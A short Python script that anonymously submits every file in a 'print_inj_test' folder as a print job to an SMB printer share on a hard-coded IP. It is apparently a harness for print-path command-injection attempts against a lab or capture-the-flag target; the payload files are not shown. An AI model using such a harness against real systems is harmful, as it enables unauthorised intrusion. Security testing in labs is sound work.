import os
import subprocess
import time

TARGET = "10.129.244.177"
SHARE = "HP-Reception"
D = "/tmp/print_inj_test"

for fname in sorted(os.listdir(D)):
    full = os.path.join(D, fname)
    print(f"=== submitting print job for: {fname!r} ===")
    cmd = ["smbclient", "-N", f"//{TARGET}/{SHARE}", "-c", f'print "{full}"']
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    print("STDOUT:", r.stdout.strip())
    print("STDERR:", r.stderr.strip())
    time.sleep(3)

print("ALL DONE")
